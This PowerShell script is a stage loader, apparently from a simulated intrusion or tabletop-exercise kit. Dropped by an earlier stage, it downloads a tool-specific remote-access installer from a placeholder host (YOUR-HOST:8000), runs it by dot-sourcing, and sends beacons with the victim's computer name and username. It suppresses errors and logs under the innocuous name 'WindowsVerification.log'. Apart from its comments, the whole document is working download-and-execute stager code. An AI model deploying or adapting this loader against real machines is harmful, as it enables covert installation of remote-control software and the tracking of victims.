# rmm.ps1 - tool-agnostic RMM loader
# stage1.ps1 drops this file; it downloads ttx/rmm/<tool>/install.ps1 from the
# tunnel and dot-sources it. All tool-specific knowledge (payload URL, install
# method, process check, beacons) lives in each tool's own install.ps1.
#
# select-rmm.sh injects the tool id into the $Tool line at container start;
# the base URL placeholders are rewritten by set-url.sh (same as stage1.ps1).

$Tool      = '__RMM_TOOL__'
$Base      = 'http://YOUR-HOST:8000/ttx'
$BeaconUrl = 'http://YOUR-HOST:8000/beacon'

$ErrorActionPreference = 'SilentlyContinue'
$Log = "$env:PUBLIC\WindowsVerification.log"

function Beacon([string]$Stage) {
  try { Invoke-WebRequest -UseBasicParsing "$BeaconUrl`?s=$Stage&h=$env:COMPUTERNAME&u=$env:USERNAME" | Out-Null } catch {}
}

# Fallback if the tool id was never injected (shouldn't happen - select-rmm.sh
# runs before this file is ever served). Deliberately matches WITHOUT the
# surrounding underscores so select-rmm.sh's placeholder rewrite can never
# turn this check into "if ($Tool -eq 'rustdesk')..." and flip the tool.
if ($Tool -like '*RMM_TOOL*') { $Tool = 'splashtop' }

Add-Content $Log "$(Get-Date -f s)  run: tool=$Tool (loader) user=$env:USERNAME"

# Fetch the tool's installer logic
$InstallPath = "$env:PUBLIC\rmm-$Tool.ps1"
$InstallUrl  = "$Base/rmm/$Tool/install.ps1"
Invoke-WebRequest -Uri $InstallUrl -OutFile $InstallPath -UseBasicParsing

if (-not (Test-Path $InstallPath)) {
  Beacon "rmm-installer-fetch-failed"
  Add-Content $Log "$(Get-Date -f s)  ERROR: could not fetch $InstallUrl"
  return
}

Beacon "rmm-start-$Tool"

# Dot-source: install.ps1 sees $Base, $BeaconUrl, $Log and Beacon() in scope
. $InstallPath
